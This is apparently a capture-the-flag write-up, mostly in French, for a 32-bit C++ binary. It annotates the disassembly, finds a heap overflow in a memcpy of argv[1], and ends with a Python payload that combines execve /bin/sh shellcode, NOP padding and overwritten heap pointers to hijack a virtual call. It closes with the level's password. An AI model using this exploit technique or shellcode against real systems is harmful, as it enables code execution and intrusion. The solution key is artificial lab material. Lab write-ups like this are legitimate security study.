```
080485f4 <main>:
 80485f4:	55                   	push   ebp
 80485f5:	89 e5                	mov    ebp,esp
 80485f7:	53                   	push   ebx
 80485f8:	83 e4 f0             	and    esp,0xfffffff0
 80485fb:	83 ec 20             	sub    esp,0x20						; 32
 80485fe:	83 7d 08 01          	cmp    DWORD PTR [ebp+0x8],0x1
 8048602:	7f 0c                	jg     8048610 <main+0x1c>			; argc > 1
 8048604:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
 804860b:	e8 e0 fe ff ff       	call   80484f0 <_exit@plt>			; exit(1)
 8048610:	c7 04 24 6c 00 00 00 	mov    DWORD PTR [esp],0x6c
 8048617:	e8 14 ff ff ff       	call   8048530 <_Znwj@plt>			; void first_call = _Znwj(108) // resolve GOT
 804861c:	89 c3                	mov    ebx,eax
 804861e:	c7 44 24 04 05 00 00 	mov    DWORD PTR [esp+0x4],0x5
 8048625:	00 
 8048626:	89 1c 24             	mov    DWORD PTR [esp],ebx
 8048629:	e8 c8 00 00 00       	call   80486f6 <_ZN1NC1Ei>			; _ZN1NC1Ei(first_call, 5)
 804862e:	89 5c 24 1c          	mov    DWORD PTR [esp+0x1c],ebx
 8048632:	c7 04 24 6c 00 00 00 	mov    DWORD PTR [esp],0x6c
 8048639:	e8 f2 fe ff ff       	call   8048530 <_Znwj@plt>			; void sec_call = _Znwj(108)
 804863e:	89 c3                	mov    ebx,eax
 8048640:	c7 44 24 04 06 00 00 	mov    DWORD PTR [esp+0x4],0x6
 8048647:	00 
 8048648:	89 1c 24             	mov    DWORD PTR [esp],ebx
 804864b:	e8 a6 00 00 00       	call   80486f6 <_ZN1NC1Ei>			; _ZN1NC1Ei(sec_call, 6)
 8048650:	89 5c 24 18          	mov    DWORD PTR [esp+0x18],ebx		; esp+0x18 = sec_call
 8048654:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 8048658:	89 44 24 14          	mov    DWORD PTR [esp+0x14],eax		; esp+0x14 = first_call
 804865c:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
 8048660:	89 44 24 10          	mov    DWORD PTR [esp+0x10],eax		; esp+0x10 = sec_call
 8048664:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 8048667:	83 c0 04             	add    eax,0x4
 804866a:	8b 00                	mov    eax,DWORD PTR [eax]
 804866c:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax		; argv[1]
 8048670:	8b 44 24 14          	mov    eax,DWORD PTR [esp+0x14]
 8048674:	89 04 24             	mov    DWORD PTR [esp],eax			; esp = first_call
 8048677:	e8 92 00 00 00       	call   804870e <_ZN1N13setAnnotationEPc>	; _ZN1N13setAnnotationEPc(first_call, argv[1])
 804867c:	8b 44 24 10          	mov    eax,DWORD PTR [esp+0x10]
 8048680:	8b 00                	mov    eax,DWORD PTR [eax]
 8048682:	8b 10                	mov    edx,DWORD PTR [eax]					; edx = **sec_call
 8048684:	8b 44 24 14          	mov    eax,DWORD PTR [esp+0x14]
 8048688:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax				; esp+0x4 = first_call
 804868c:	8b 44 24 10          	mov    eax,DWORD PTR [esp+0x10]
 8048690:	89 04 24             	mov    DWORD PTR [esp],eax					; esp = sec_call
 8048693:	ff d2                	call   edx									; **sec_call(sec_call, first_call)
 8048695:	8b 5d fc             	mov    ebx,DWORD PTR [ebp-0x4]
 8048698:	c9                   	leave
 8048699:	c3                   	ret

080486f6 <_ZN1NC1Ei>:
80486f6:	55                   	push   ebp
80486f7:	89 e5                	mov    ebp,esp
80486f9:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]		; 1e arg?
80486fc:	c7 00 48 88 04 08    	mov    DWORD PTR [eax],0x8048848	; *eax = 0x8048848
8048702:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]
8048705:	8b 55 0c             	mov    edx,DWORD PTR [ebp+0xc]		; 2e arg ?
8048708:	89 50 68             	mov    DWORD PTR [eax+0x68],edx		; *(eax + 104) = ebp+0xc
804870b:	5d                   	pop    ebp
804870c:	c3                   	ret

0804870e <_ZN1N13setAnnotationEPc>:
 804870e:	55                   	push   ebp
 804870f:	89 e5                	mov    ebp,esp
 8048711:	83 ec 18             	sub    esp,0x18						; 24
 8048714:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 8048717:	89 04 24             	mov    DWORD PTR [esp],eax
 804871a:	e8 01 fe ff ff       	call   8048520 <strlen@plt>
 804871f:	8b 55 08             	mov    edx,DWORD PTR [ebp+0x8]
 8048722:	83 c2 04             	add    edx,0x4
 8048725:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 8048729:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 804872c:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 8048730:	89 14 24             	mov    DWORD PTR [esp],edx
 8048733:	e8 d8 fd ff ff       	call   8048510 <memcpy@plt>	; memcpy(arg[0], arg[1], strlen(arg[1]))
 8048738:	c9                   	leave
 8048739:	c3                   	ret
```

À la fin, on call `edx`, c'est probablement de là dont vient la vulnérabilité. La difficulté de l'exercice est de connaitre quelle est la fonction
derrière `_Znwj`.


```
08048530 <_Znwj@plt>:
 8048530:	ff 25 70 9b 04 08    	jmp    DWORD PTR ds:0x8049b70
 8048536:	68 40 00 00 00       	push   0x40
 804853b:	e9 60 ff ff ff       	jmp    80484a0 <_init+0x3c>
```

Il faut que le résultat de `sec_call` soit égal à une adresse avec des instructions.

to get the `_Znwj` function code, I looked at the `info proc map` result command in gdb, and saw that we have `/usr/lib/i386-linux-gnu/libstdc++.so.6.0.16` in the linker.

So, I ran the command `objdump -R /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16 | grep _Znwj`:
`000dd980 R_386_JUMP_SLOT   _Znwj`
`_Znwj is aka "operator new". `

Quand bien même le code soit écrit en c++, je vais essayer de le reconstituer en c.

Grâce à `gdb`, je sais que la première allocation est effectuée à `0x804a008` et la seconde à `0x804a078`.
Par conséquent, grâce au heap buffer overflow du `memcpy` de `argv[1]`, on pourra écraser l'adresse contenu dans `0x804a078`
pour la faire pointer vers un pointeur qui pointera vers par exemple un shell code contenu dans la heap, puis l'exécutera.

Notre shellcode sera :
https://shell-storm.org/shellcode/files/shellcode-606.html

On devra par la suite écrire le padding de `NOP`, puis l'adresse du début du shellcode, et enfin récrire l'adresse de l'adresse du début du shellcode.

L'adresse où sera contenu l'opcode sera donc `0x804a00c` (4 octets après le début de l'adresse allouée).
Et le pointeur sur l'adresse contenant le début de l'opcode sera `0x0804a074` (soit 4 octets de moi que l'adresse de la deuxième allocation).

```py
payload = ("\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70" +
		"\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61" +
		"\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52" +
		"\x51\x53\x89\xe1\xcd\x80")
print(payload + "\x90" * (104 - len(payload)) + "\x0c\xa0\x04\x08" + "\x74\xa0\x04\x08")
```

Password: `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728`